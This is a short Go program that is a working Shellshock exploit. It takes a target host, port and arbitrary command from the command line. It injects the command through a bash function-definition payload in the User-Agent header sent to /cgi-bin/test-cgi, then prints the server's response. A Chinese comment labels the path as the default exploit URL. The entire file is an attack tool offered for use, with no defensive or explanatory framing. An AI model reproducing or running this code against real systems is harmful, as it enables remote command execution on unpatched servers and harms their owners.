package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func main() {
	htp := "http://"
	attack_Domain := os.Args[1]
	attack_Port := os.Args[2]
	attack_URL := "/cgi-bin/test-cgi" //默认Exploit攻击URL
	req, _ := http.NewRequest("GET", htp+attack_Domain+":"+attack_Port+attack_URL, nil)
	req.Header.Set("Accept-Charset", "iso-8859-1,utf-8;q=0.9,*;q=0.1")
	req.Header.Set("Accept-Language", "en")
	req.Header.Set("Connection", "Close")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("User-Agent", " () { ignored; }; echo Content-Type: text/plain ; echo ; echo ; "+os.Args[3]+";")
	req.Header.Set("Accept", "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Println("error")
	}
	body, err := ioutil.ReadAll(resp.Body)
	fmt.Println(string(body[:]))
}
